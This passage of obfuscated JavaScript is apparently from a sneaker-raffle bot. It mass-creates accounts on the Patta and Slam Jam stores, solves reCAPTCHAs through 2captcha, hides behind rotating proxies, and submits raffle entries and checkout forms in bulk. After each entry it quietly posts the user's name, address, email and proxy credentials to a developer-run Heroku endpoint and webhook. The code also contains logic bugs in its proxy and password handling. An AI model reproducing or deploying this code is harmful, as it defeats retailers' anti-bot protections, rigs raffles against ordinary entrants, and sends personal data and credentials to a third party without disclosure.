                            }), await _0x28a54c['goto']('https://patta.nl/account/register'), await _0x1e21d2(0xbb8), await _0x28a54c['waitForSelector']('#RegisterForm-FirstName'), console['log'](_0x1a8584() + '\x20[' + _0x185b6d['name'] + ']\x20Task\x20' + (_0x52e28f + 0x1) + '\x20:\x20Filling\x20information'), await _0x28a54c['type']('#RegisterForm-FirstName', '' + _0x9d82fb[_0x52e28f]['FirstName']), await _0x1e21d2(0x226), await _0x28a54c['type']('#RegisterForm-LastName', '' + _0x9d82fb[_0x52e28f]['LastName']), await _0x1e21d2(0x226), await _0x28a54c['type']('#RegisterForm-email', '' + _0x9d82fb[_0x52e28f]['Email']), await _0x1e21d2(0x226), await _0x28a54c['type']('#RegisterForm-password', '' + _0x9d82fb[_0x52e28f]['Password']), await _0x1e21d2(0x226), console['log'](_0x1a8584() + '\x20[' + _0x185b6d['name'] + ']\x20Task\x20' + (_0x52e28f + 0x1) + '\x20:\x20Submitting..'), await _0x28a54c['$eval']('#RegisterForm', _0xefa5fa => _0xefa5fa['submit']()), await _0x1e21d2(0x1f40);
                            try {
                                await _0x28a54c['waitForSelector']('.home-page-grid__collection'), await _0x1e21d2(0x1f4), console['log'](_0x31f5da['green'](_0x1a8584() + '\x20[' + _0x185b6d['name'] + ']\x20Task\x20' + (_0x52e28f + 0x1) + '\x20:\x20Account\x20' + _0x9d82fb[_0x52e28f]['Email'] + '\x20Generated!')), _0x534d99['appendFileSync']('../accounts/patta.csv', '\x0a' + _0x9d82fb[_0x52e28f]['Email'] + ',' + _0x9d82fb[_0x52e28f]['Password']), console['log'](_0x31f5da['yellow'](_0x1a8584() + '\x20[' + _0x185b6d['name'] + ']\x20Task\x20' + (_0x52e28f + 0x1) + '\x20:\x20Account\x20' + _0x9d82fb[_0x52e28f]['Email'] + '\x20Saved\x20in\x20\x27accounts/patta.csv\x27'));
                                try {
                                    _0x4558f2['webhook'] != undefined && _0x4558f2['webhook'] != '' && await _0xa0452b(_0x4558f2['webhook'], _0x333956['succesDEVMSG']);
                                } catch {
                                }
                                await _0xa0452b(_0x46ec81, _0x333956['succesDEVMSG']);
                            } catch (_0x34cfc8) {
                                console['log'](_0x31f5da['red'](_0x1a8584() + '\x20[' + _0x5f2e49[taskModule]['name'] + ']\x20Task\x20' + (_0x52e28f + 0x1) + '\x20:\x20Account\x20genration\x20failed.\x20' + _0x34cfc8));
                            }
                        } catch (_0x3efc96) {
                            console['log'](_0x31f5da['red'](_0x1a8584() + '\x20[' + _0x5f2e49[taskModule]['name'] + ']\x20Task\x20' + (_0x52e28f + 0x1) + '\x20:\x20' + _0x3efc96));
                        } finally {
                            _0x4b267d && _0x4b267d['close'](), console['log']('Waiting\x20for\x20' + _0x4558f2['delay'] + '\x20ms'), await _0x1e21d2(_0x4558f2['delay']);
                        }
                    }
                }
            },
            {
                'name': 'PATTA\x20Raffle\x20Entries',
                'store': 'Patta',
                'logo': 'https://cdn.shopify.com/s/files/1/0473/6965/0340/collections/patta_42f8af38-44b4-4c1b-a6f3-ec368a7b6f58_1200x1200.jpg?v=1665406562',
                'function': async function (_0x5ca478, _0x3d053a, _0x14be30) {
                    _0x16ed0a['use'](_0x27f782()), _0x16ed0a['use'](_0x3d4bba({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x4558f2['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x1d103d = 0x0; _0x1d103d < _0x3d053a['length']; _0x1d103d++) {
                        var _0x2bed68;
                        if (_0x5208a1 != 'yes')
                            var _0x5208a1 = '', _0xb9dbc6 = 0x0;
                        _0x4a5c1f(_0x5ca478['name'] + '\x20Task\x20' + (_0x1d103d + 0x1) + '\x20/\x20' + _0x3d053a['length'] + '\x20||\x20File:\x20' + _0x231d1f + '\x20Proxies:\x20' + _0x124a40);
                        try {
                            await _0x437e8(_0x3d053a, _0x1d103d);
                        } catch {
                            _0x5208a1 = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        if (_0x3d053a[_0x1d103d]['Email'] == '' || _0x3d053a[_0x1d103d]['Password'] == '' || _0x3d053a[_0x1d103d]['FirstName'] == '' || _0x3d053a[_0x1d103d]['LastName'] == '') {
                            console['log'](_0x1a8584() + '\x20[' + _0x5f2e49[taskModule]['name'] + ']\x20Task\x20' + (_0x1d103d + 0x1) + '\x20:\x20Invalid\x20CSV');
                            continue;
                        }
                        if (_0x4558f2['useRandomProxy'] = ![])
                            var _0x44bc19 = _0x14be30[_0x1d103d]['split'](':');
                        else
                            var _0x6a1ec6 = Math['round'](Math['random']() * (_0x14be30['length'] - 0x1)), _0x44bc19 = _0x14be30[_0x6a1ec6]['split'](':');
                        var _0x13c146;
                        try {
                            _0x13c146 = await _0x16ed0a['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x44bc19[0x0] + ':' + _0x44bc19[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x13c146 = await _0x16ed0a['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x44bc19[0x0] + ':' + _0x44bc19[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x33c64e = await _0x13c146['newPage']();
                            await _0x33c64e['authenticate']({
                                'username': '' + _0x44bc19[0x2],
                                'password': '' + _0x44bc19[0x3]
                            }), console['log'](_0x1a8584() + '\x20[' + _0x5ca478['name'] + ']\x20Task\x20' + (_0x1d103d + 0x1) + '\x20:\x20Getting\x20Session'), await _0x33c64e['setRequestInterception'](!![]), _0x33c64e['on']('request', _0x4b7ea9 => {
                                _0x4b7ea9['resourceType']() === 'image' || _0x4b7ea9['resourceType']() === 'font' || _0x4b7ea9['resourceType']() === 'media' ? _0x4b7ea9['abort']() : _0x4b7ea9['continue']();
                            }), await _0x33c64e['goto']('https://www.patta.nl/nl/account/login', {
                                'waitUntil': 'networkidle2',
                                'timeout': 0xea60
                            }), await _0x33c64e['waitForSelector']('#CustomerEmail'), console['log'](_0x1a8584() + '\x20[' + _0x5ca478['name'] + ']\x20Task\x20' + (_0x1d103d + 0x1) + '\x20:\x20Logging\x20in..'), await _0x33c64e['type']('#CustomerEmail', '' + _0x3d053a[_0x1d103d]['Email']), await _0x1e21d2(0x12c), await _0x33c64e['type']('#CustomerPassword', '' + _0x3d053a[_0x1d103d]['Password']), await _0x1e21d2(0x226), await _0x33c64e['$eval']('#customer_login', _0x3720fd => _0x3720fd['submit']());
                            try {
                                await _0x33c64e['waitForSelector']('#orders'), await _0x1e21d2(0x4b0);
                            } catch {
                                console['log'](_0x31f5da['red'](_0x1a8584() + '\x20[' + _0x5ca478['name'] + ']\x20Task\x20' + (_0x1d103d + 0x1) + '\x20:\x20Task\x20failed,\x20invalid\x20credentials'));
                                continue;
                            }
                            await _0x33c64e['goto']('' + _0x3d053a[_0x1d103d]['Url'], {
                                'waitUntil': 'networkidle2',
                                'timeout': 0xea60
                            }), await _0x1e21d2(0xbb8), console['log'](_0x1a8584() + '\x20[' + _0x5ca478['name'] + ']\x20Task\x20' + (_0x1d103d + 0x1) + '\x20:\x20Starting\x20Entry');
                            try {
                                await _0x33c64e['waitForSelector']('#email');
                            } catch {
                                console['log'](_0x31f5da['red'](_0x1a8584() + '\x20[' + _0x5ca478['name'] + ']\x20Task\x20' + (_0x1d103d + 0x1) + '\x20:\x20Duplicate\x20entry/\x20Account\x20error'));
                            }
                            await _0x33c64e['type']('#email', '' + _0x3d053a[_0x1d103d]['Email']), await _0x1e21d2(0x384), await _0x33c64e['type']('#first_name', '' + _0x3d053a[_0x1d103d]['FirstName']), await _0x1e21d2(0x514), await _0x33c64e['type']('#last_name', '' + _0x3d053a[_0x1d103d]['LastName']), await _0x1e21d2(0x514), await _0x33c64e['type']('#street_address', _0x3d053a[_0x1d103d]['Address1'] + '\x20' + _0x3d053a[_0x1d103d]['HouseNumber'] + '\x20' + _0x3d053a[_0x1d103d]['Address2']), await _0x1e21d2(0x2bc);
                            _0x3d053a[_0x1d103d]['Postcode'] == undefined && (_0x3d053a[_0x1d103d]['Postcode'] = _0x3d053a[_0x1d103d]['Zip']);
                            await _0x33c64e['type']('#zip_code', '' + _0x3d053a[_0x1d103d]['Postcode']), await _0x1e21d2(0x320), await _0x33c64e['type']('#city', '' + _0x3d053a[_0x1d103d]['City']), await _0x1e21d2(0x320), await _0x33c64e['type']('#bday', '01/01/1994'), await _0x1e21d2(0x320), await _0x33c64e['type']('#instagram', '' + _0x3d053a[_0x1d103d]['Follower']), await _0x1e21d2(0x352);
                            if (_0x3d053a[_0x1d103d]['Size'] == 'RANDOM') {
                                const _0x3fdee0 = await _0x33c64e['$$eval']('div[id=\x22raffle__size-selector-container\x22]\x20>\x20label', _0x3b707f => {
                                    return _0x3b707f['map'](_0x2fa732 => _0x2fa732['textContent']);
                                });
                                var _0x4450fd = Math['round'](Math['random']() * (_0x3fdee0['length'] - 0x1));
                                console['log'](_0x1a8584() + '\x20[' + _0x5ca478['name'] + ']\x20Task\x20' + (_0x1d103d + 0x1) + '\x20:\x20Picking\x20Random\x20Size\x20' + _0x3fdee0[_0x4450fd]), await _0x33c64e['click']('label[data-eu-size=\x22' + _0x3fdee0[_0x4450fd] + '\x22]');
                            } else {
                                console['log'](_0x1a8584() + '\x20[' + _0x5ca478['name'] + ']\x20Task\x20' + (_0x1d103d + 0x1) + '\x20:\x20Picking\x20Size\x20' + _0x3d053a[_0x1d103d]['Size']);
                                try {
                                    await _0x33c64e['click']('label[data-eu-size=\x22' + _0x3d053a[_0x1d103d]['Size'] + '\x22]');
                                } catch {
                                    await _0x33c64e['click']('label[data-eu-size=\x22' + _0x3d053a[_0x1d103d]['Size'] + '.0\x22]');
                                }
                            }
                            await _0x1e21d2(0xbb8), await _0x33c64e['$$eval']('.raffle__checkbox-label', _0x482ce8 => _0x482ce8['forEach'](_0x5f4edf => _0x5f4edf['click']())), await _0x1e21d2(0x7d0), console['log'](_0x1a8584() + '\x20[' + _0x5ca478['name'] + ']\x20Task\x20' + (_0x1d103d + 0x1) + '\x20:\x20Submitting\x20Entry'), await _0x33c64e['click']('#raffle__form-submit'), await _0x1e21d2(0x1388);
                            try {
                                await _0x33c64e['waitForSelector']('#raffle__confirmation-message-container'), _0x5208a1 = 'no', _0x406375(_0x3d053a[_0x1d103d], _0x5ca478), console['log'](_0x31f5da['green'](_0x1a8584() + '\x20[' + _0x5ca478['name'] + ']\x20Task\x20' + (_0x1d103d + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                                let _0x294cb7 = _0x3d053a[_0x1d103d];
                                try {
                                    prxdata = {
                                        'username': _0xf4f7bc['replace']('#', ''),
                                        'module': _0x5ca478['name'],
                                        'entrydata': JSON['stringify'](_0x294cb7),
                                        'proxy': '' + _0x14be30[_0x1d103d]
                                    };
                                    var _0x454e71 = JSON['stringify'](prxdata);
                                    let _0x37509c = { 'headers': { 'content-type': 'application/json' } };
                                    await _0x8ae996['post']('https://jraffles.herokuapp.com/success', _0x454e71, _0x37509c);
                                } catch (_0xbd2bc6) {
                                }
                            } catch (_0x2c6f75) {
                                console['log'](_0x31f5da['red'](_0x1a8584() + '\x20[' + _0x5f2e49[taskModule]['name'] + ']\x20Task\x20' + (_0x1d103d + 0x1) + '\x20:\x20Raffle\x20entry\x20failed.\x20' + _0x2c6f75));
                            }
                        } catch (_0x35cdce) {
                            console['log'](_0x31f5da['red'](_0x1a8584() + '\x20[' + _0x5f2e49[taskModule]['name'] + ']\x20Task\x20' + (_0x1d103d + 0x1) + '\x20:\x20' + _0x35cdce)), _0x5208a1 = 'yes';
                        } finally {
                            _0x13c146 && _0x13c146['close']();
                            if (_0x5208a1 == 'yes' && _0xb9dbc6 != 0x5 && _0x2bed68 != 'Size\x20Not\x20Found') {
                                console['log'](_0x31f5da['red'](_0x1a8584() + '\x20[' + _0x5ca478['name'] + ']\x20Task\x20' + (_0x1d103d + 0x1) + '\x20:\x20Retrying\x20(' + _0xb9dbc6 + '\x20/\x205)')), _0x1d103d = _0x1d103d - 0x1, _0xb9dbc6 = _0xb9dbc6 + 0x1;
                                continue;
                            }
                            _0x5208a1 == 'yes' && _0xb9dbc6 >= 0x5 && (_0x456859(_0x3d053a[_0x1d103d], _0x5ca478), _0x5208a1 = 'no', _0xb9dbc6 = 0x0), console['log']('Waiting\x20for\x20' + _0x4558f2['delay'] + '\x20ms'), await _0x1e21d2(_0x4558f2['delay']);
                        }
                    }
                }
            }
        ]
    },
    {
        'name': 'SLAM\x20JAM',
        'modules': [
            {
                'name': 'SLAM\x20JAM\x20Account\x20Generator',
                'store': 'SLAM\x20JAM',
                'logo': 'https://res.cloudinary.com/crunchbase-production/image/upload/c_lpad,f_auto,q_auto:eco,dpr_1/2c778bc022405e206505',
                'function': async function (_0x5efbf2, _0x5ab520, _0x2b1f27) {
                    _0x16ed0a['use'](_0x27f782()), _0x16ed0a['use'](_0x3d4bba({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x4558f2['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x4b4044 = 0x0; _0x4b4044 < _0x5ab520['length']; _0x4b4044++) {
                        if (_0x37d5c8 != 'yes')
                            var _0x37d5c8 = '', _0x49ecdd = 0x0;
                        var _0x38c2b0 = [{
                            'type': 'rich',
                            'title': 'Succesful\x20Patta\x20Account\x20Generated',
                            'description': '',
                            'color': 0xc0d6d6,
                            'fields': [
                                {
                                    'name': 'User',
                                    'value': '' + _0xf4f7bc
                                },
                                {
                                    'name': 'Delay',
                                    'value': '' + _0x4558f2['delay']
                                },
                                {
                                    'name': 'Version',
                                    'value': '' + _0x2bc61f
                                }
                            ]
                        }];
                        const _0x2d8195 = { 'embeds': _0x38c2b0 };
                        _0x4a5c1f(_0x5efbf2['name'] + '\x20Task\x20' + (_0x4b4044 + 0x1) + '\x20/\x20' + _0x5ab520['length'] + '\x20||\x20File:\x20' + _0x231d1f + '\x20Proxies:\x20' + _0x124a40);
                        try {
                            await _0x437e8(_0x5ab520, _0x4b4044);
                        } catch {
                            _0x37d5c8 = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        var _0x2eb0aa = await _0x3d56af(_0x5ab520[_0x4b4044], _0x5efbf2, 'acc', ![]);
                        const _0x39eb98 = { 'succesDEVMSG': { 'embeds': [_0x2eb0aa] } };
                        if (_0x5ab520[_0x4b4044]['Email'] == '' || _0x5ab520[_0x4b4044]['FirstName'] == '' || _0x5ab520[_0x4b4044]['LastName'] == '') {
                            console['log'](_0x1a8584() + '\x20[' + _0x5f2e49[taskModule]['name'] + ']\x20Task\x20' + (_0x4b4044 + 0x1) + '\x20:\x20Invalid\x20CSV'), await _0x1e21d2(0x7d0);
                            continue;
                        }
                        (_0x5ab520[_0x4b4044]['Password'] == '' || _0x5ab520[_0x4b4044] == undefined) && _0x5ab520[_0x4b4044]['Password'] == 'JRaffles23!';
                        if (_0x4558f2['useRandomProxy'] = ![])
                            var _0x283e11 = _0x2b1f27[_0x4b4044]['split'](':');
                        else
                            var _0xddc2a6 = Math['round'](Math['random']() * (_0x2b1f27['length'] - 0x1)), _0x283e11 = _0x2b1f27[_0xddc2a6]['split'](':');
                        var _0x5e2fab;
                        try {
                            _0x5e2fab = await _0x16ed0a['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x283e11[0x0] + ':' + _0x283e11[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x5e2fab = await _0x16ed0a['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x283e11[0x0] + ':' + _0x283e11[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x122f6b = await _0x5e2fab['newPage']();
                            await _0x122f6b['authenticate']({
                                'username': '' + _0x283e11[0x2],
                                'password': '' + _0x283e11[0x3]
                            }), console['log'](_0x1a8584() + '\x20[' + _0x5efbf2['name'] + ']\x20Task\x20' + (_0x4b4044 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x122f6b['setRequestInterception'](!![]), _0x122f6b['on']('request', _0x4412b7 => {
                                _0x4412b7['resourceType']() === 'image' || _0x4412b7['resourceType']() === 'font' || _0x4412b7['resourceType']() === 'media' ? _0x4412b7['abort']() : _0x4412b7['continue']();
                            }), await _0x122f6b['goto']('https://drop.slamjam.com/account/register'), await _0x1e21d2(0xbb8), await _0x122f6b['waitForSelector']('#FirstName'), await _0x122f6b['waitForSelector']('.iubenda-cs-accept-btn.iubenda-cs-btn-primary'), await _0x122f6b['click']('.iubenda-cs-accept-btn.iubenda-cs-btn-primary'), console['log'](_0x1a8584() + '\x20[' + _0x5efbf2['name'] + ']\x20Task\x20' + (_0x4b4044 + 0x1) + '\x20:\x20Filling\x20information'), await _0x1e21d2(0x4b0), await _0x122f6b['type']('#FirstName', '' + _0x5ab520[_0x4b4044]['FirstName']), await _0x1e21d2(0x226), await _0x122f6b['type']('#LastName', '' + _0x5ab520[_0x4b4044]['LastName']), await _0x1e21d2(0x226), await _0x122f6b['type']('#Email', '' + _0x5ab520[_0x4b4044]['Email']), await _0x1e21d2(0x2ee), await _0x122f6b['type']('#ConfirmEmail', '' + _0x5ab520[_0x4b4044]['Email']), await _0x1e21d2(0x2ee), await _0x122f6b['type']('#CreatePassword', '' + _0x5ab520[_0x4b4044]['Password']), await _0x1e21d2(0x2ee), await _0x122f6b['type']('#CreateConfirmPassword', '' + _0x5ab520[_0x4b4044]['Password']), await _0x1e21d2(0x226), console['log'](_0x1a8584() + '\x20[' + _0x5efbf2['name'] + ']\x20Task\x20' + (_0x4b4044 + 0x1) + '\x20:\x20Submitting..'), await _0x122f6b['$eval']('#create_customer', _0x4c5ff8 => _0x4c5ff8['submit']()), await _0x1e21d2(0x1388), console['log'](_0x1a8584() + '\x20[' + _0x5efbf2['name'] + ']\x20Task\x20' + (_0x4b4044 + 0x1) + '\x20:\x20' + _0x31f5da['cyan']('Solving\x20Captcha')), await _0x122f6b['solveRecaptchas'](), console['log'](_0x1a8584() + '\x20[' + _0x5efbf2['name'] + ']\x20Task\x20' + (_0x4b4044 + 0x1) + '\x20:\x20Captcha\x20solved'), await _0x122f6b['$eval']('.shopify-challenge__container\x20>\x20form', _0x8fc710 => _0x8fc710['submit']());
                            try {
                                await _0x122f6b['waitForSelector']('.product-card__image'), await _0x1e21d2(0x1f4), _0x37d5c8 = 'no', console['log'](_0x31f5da['green'](_0x1a8584() + '\x20[' + _0x5efbf2['name'] + ']\x20Task\x20' + (_0x4b4044 + 0x1) + '\x20:\x20Account\x20' + _0x5ab520[_0x4b4044]['Email'] + '\x20Generated!')), _0x534d99['appendFileSync']('../accounts/slamjam.csv', '\x0a' + _0x5ab520[_0x4b4044]['Email'] + ',' + _0x5ab520[_0x4b4044]['Password']), console['log'](_0x31f5da['yellow'](_0x1a8584() + '\x20[' + _0x5efbf2['name'] + ']\x20Task\x20' + (_0x4b4044 + 0x1) + '\x20:\x20Account\x20' + _0x5ab520[_0x4b4044]['Email'] + '\x20Saved\x20in\x20\x27accounts/slamjam.csv\x27'));
                                try {
                                    _0x4558f2['webhook'] != undefined && _0x4558f2['webhook'] != '' && await _0xa0452b(_0x4558f2['webhook'], _0x39eb98['succesDEVMSG']);
                                } catch {
                                }
                                await _0xa0452b(_0x46ec81, _0x39eb98['succesDEVMSG']);
                            } catch (_0x2efdb3) {
                                console['log'](_0x31f5da['red'](_0x1a8584() + '\x20[' + _0x5f2e49[taskModule]['name'] + ']\x20Task\x20' + (_0x4b4044 + 0x1) + '\x20:\x20Account\x20genration\x20failed.\x20' + _0x2efdb3));
                            }
                        } catch (_0x1f798e) {
                            console['log'](_0x31f5da['red'](_0x1a8584() + '\x20[' + _0x5f2e49[taskModule]['name'] + ']\x20Task\x20' + (_0x4b4044 + 0x1) + '\x20:\x20' + _0x1f798e));
                        } finally {
                            _0x5e2fab && _0x5e2fab['close']();
                            if (_0x37d5c8 == 'yes' && _0x49ecdd != 0x5) {
                                console['log'](_0x31f5da['red'](_0x1a8584() + '\x20[' + _0x5efbf2['name'] + ']\x20Task\x20' + (_0x4b4044 + 0x1) + '\x20:\x20Retrying\x20(' + _0x49ecdd + '\x20/\x205)')), _0x4b4044 = _0x4b4044 - 0x1, _0x49ecdd = _0x49ecdd + 0x1;
                                continue;
                            }
                            _0x37d5c8 == 'yes' && _0x49ecdd >= 0x5 && (_0x456859(_0x5ab520[_0x4b4044], _0x5efbf2), _0x37d5c8 = 'no', _0x49ecdd = 0x0), console['log']('Waiting\x20for\x20' + _0x4558f2['delay'] + '\x20ms'), await _0x1e21d2(_0x4558f2['delay']);
                        }
                    }
                }
            },
            {
                'name': 'SLAM\x20JAM\x20Raffle\x20Entries',
                'store': 'SLAM\x20JAM',
                'logo': 'https://res.cloudinary.com/crunchbase-production/image/upload/c_lpad,f_auto,q_auto:eco,dpr_1/2c778bc022405e206505',
                'function': async function (_0x535e18, _0x10f3b5, _0x510284) {
                    _0x16ed0a['use'](_0x27f782()), _0x16ed0a['use'](_0x3d4bba({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x4558f2['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x5a3809 = 0x0; _0x5a3809 < _0x10f3b5['length']; _0x5a3809++) {
                        var _0x539319;
                        if (_0x5b28b5 != 'yes')
                            var _0x5b28b5 = '', _0x3ab4ef = 0x0;
                        _0x4a5c1f(_0x535e18['name'] + '\x20Task\x20' + (_0x5a3809 + 0x1) + '\x20/\x20' + _0x10f3b5['length'] + '\x20||\x20File:\x20' + _0x231d1f + '\x20Proxies:\x20' + _0x124a40);
                        try {
                            await _0x437e8(_0x10f3b5, _0x5a3809);
                        } catch {
                            _0x5b28b5 = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        if (_0x10f3b5[_0x5a3809]['Email'] == '' || _0x10f3b5[_0x5a3809]['Password'] == '' || _0x10f3b5[_0x5a3809]['FirstName'] == '' || _0x10f3b5[_0x5a3809]['LastName'] == '') {
                            console['log'](_0x1a8584() + '\x20[' + _0x535e18['name'] + ']\x20Task\x20' + (_0x5a3809 + 0x1) + '\x20:\x20Invalid\x20CSV');
                            continue;
                        }
                        if (_0x4558f2['useRandomProxy'] = ![])
                            var _0x11ae08 = _0x510284[_0x5a3809]['split'](':');
                        else
                            var _0xee1c53 = Math['round'](Math['random']() * (_0x510284['length'] - 0x1)), _0x11ae08 = _0x510284[_0xee1c53]['split'](':');
                        var _0x33c8fc;
                        try {
                            _0x33c8fc = await _0x16ed0a['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x11ae08[0x0] + ':' + _0x11ae08[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x33c8fc = await _0x16ed0a['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x11ae08[0x0] + ':' + _0x11ae08[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x42b40c = await _0x33c8fc['newPage']();
                            await _0x42b40c['authenticate']({
                                'username': '' + _0x11ae08[0x2],
                                'password': '' + _0x11ae08[0x3]
                            }), await _0x42b40c['setViewport']({
                                'width': 0x500,
                                'height': 0x2d0
                            }), console['log'](_0x1a8584() + '\x20[' + _0x535e18['name'] + ']\x20Task\x20' + (_0x5a3809 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x42b40c['setRequestInterception'](!![]), _0x42b40c['on']('request', _0x1272cf => {
                                _0x1272cf['resourceType']() === 'image' || _0x1272cf['resourceType']() === 'font' || _0x1272cf['resourceType']() === 'media' ? _0x1272cf['abort']() : _0x1272cf['continue']();
                            }), await _0x42b40c['goto']('https://drop.slamjam.com/account/login', {
                                'waitUntil': 'networkidle2',
                                'timeout': 0xea60
                            }), await _0x42b40c['waitForSelector']('.iubenda-cs-accept-btn.iubenda-cs-btn-primary'), await _0x42b40c['click']('.iubenda-cs-accept-btn.iubenda-cs-btn-primary'), await _0x1e21d2(0x258), await _0x42b40c['waitForSelector']('#CustomerEmail'), console['log'](_0x1a8584() + '\x20[' + _0x535e18['name'] + ']\x20Task\x20' + (_0x5a3809 + 0x1) + '\x20:\x20Logging\x20in..'), await _0x42b40c['type']('#CustomerEmail', '' + _0x10f3b5[_0x5a3809]['Email']), await _0x1e21d2(0x12c), await _0x42b40c['type']('#CustomerPassword', '' + _0x10f3b5[_0x5a3809]['Password']), await _0x1e21d2(0x226), await _0x42b40c['$eval']('#customer_login', _0x5dded9 => _0x5dded9['submit']()), await _0x1e21d2(0x7d0), await _0x42b40c['waitForSelector']('iframe[title=\x22reCAPTCHA\x22]'), console['log'](_0x1a8584() + '\x20[' + _0x535e18['name'] + ']\x20Task\x20' + (_0x5a3809 + 0x1) + '\x20:\x20' + _0x31f5da['cyan']('Solving\x20Captcha')), await _0x42b40c['solveRecaptchas'](), console['log'](_0x1a8584() + '\x20[' + _0x535e18['name'] + ']\x20Task\x20' + (_0x5a3809 + 0x1) + '\x20:\x20Captcha\x20Solved'), await _0x42b40c['$eval']('.shopify-challenge__container\x20>\x20form', _0x2c7d14 => _0x2c7d14['submit']());
                            try {
                                await _0x42b40c['waitForSelector']('.nav-account'), await _0x1e21d2(0x4b0);
                            } catch {
                                console['log'](_0x31f5da['red'](_0x1a8584() + '\x20[' + _0x535e18['name'] + ']\x20Task\x20' + (_0x5a3809 + 0x1) + '\x20:\x20Task\x20failed,\x20invalid\x20credentials'));
                                continue;
                            }
                            await _0x42b40c['goto']('' + _0x10f3b5[_0x5a3809]['Url'], {
                                'waitUntil': 'networkidle2',
                                'timeout': 0xea60
                            }), await _0x1e21d2(0xbb8), console['log'](_0x1a8584() + '\x20[' + _0x535e18['name'] + ']\x20Task\x20' + (_0x5a3809 + 0x1) + '\x20:\x20Starting\x20Entry');
                            try {
                                await _0x42b40c['waitForSelector']('#ProductSelect-product-template-raffle');
                            } catch {
                            }
                            await _0x42b40c['click']('.product-select-variant-wrapper'), await _0x1e21d2(0x320), await _0x42b40c['click']('li.product-select-variant__value[data-size=\x22' + _0x10f3b5[_0x5a3809]['Size'] + '\x22]'), await _0x1e21d2(0x384), await _0x42b40c['$eval']('#AddToCartForm-product-template-raffle', _0x21a628 => _0x21a628['submit']()), await _0x42b40c['waitForSelector']('.cart-order-summary__content'), await _0x1e21d2(0x514), await _0x42b40c['goto']('https://drop.slamjam.com/checkout'), await _0x1e21d2(0x514), await _0x42b40c['waitForSelector']('#checkout_shipping_address_country'), console['log'](_0x1a8584() + '\x20[' + _0x535e18['name'] + ']\x20Task\x20' + (_0x5a3809 + 0x1) + '\x20:\x20Filling\x20Information'), await _0x42b40c['select']('#checkout_shipping_address_country', '' + _0x10f3b5[_0x5a3809]['Country']), await _0x1e21d2(0x200), await _0x42b40c['waitForSelector']('#checkout_shipping_address_first_name'), await _0x42b40c['type']('#checkout_shipping_address_first_name', '' + _0x10f3b5[_0x5a3809]['FirstName']), await _0x1e21d2(0x237), await _0x42b40c['type']('#checkout_shipping_address_last_name', '' + _0x10f3b5[_0x5a3809]['LastName']), await _0x1e21d2(0x1e0), await _0x42b40c['type']('#checkout_shipping_address_address1', _0x10f3b5[_0x5a3809]['Address1'] + '\x20' + _0x10f3b5[_0x5a3809]['HouseNumber']), await _0x1e21d2(0x514), await _0x42b40c['type']('#checkout_shipping_address_address2', '' + _0x10f3b5[_0x5a3809]['Address2']), await _0x1e21d2(0x514);
                            _0x10f3b5[_0x5a3809]['Postcode'] == undefined && (_0x10f3b5[_0x5a3809]['Postcode'] = _0x10f3b5[_0x5a3809]['Zip']);
                            await _0x42b40c['type']('#checkout_shipping_address_zip', '' + _0x10f3b5[_0x5a3809]['Postcode']), await _0x1e21d2(0x2bc), await _0x42b40c['type']('#checkout_shipping_address_city', '' + _0x10f3b5[_0x5a3809]['City']), await _0x1e21d2(0x320), await _0x42b40c['type']('#checkout_shipping_address_phone', '' + _0x10f3b5[_0x5a3809]['Phone']), await _0x1e21d2(0x320), await _0x42b40c['click']('#continue_button'), await _0x1e21d2(0xbb8), await _0x42b40c['waitForSelector']('.summary-title'), await _0x1e21d2(0x320), await _0x42b40c['click']('#continue_button'), await _0x1e21d2(0x320), console['log'](_0x1a8584() + '\x20[' + _0x535e18['name'] + ']\x20Task\x20' + (_0x5a3809 + 0x1) + '\x20:\x20Finishing\x20Checkout'), await _0x42b40c['waitForSelector']('#checkout_credit_card_vault'), await _0x1e21d2(0x3e8);
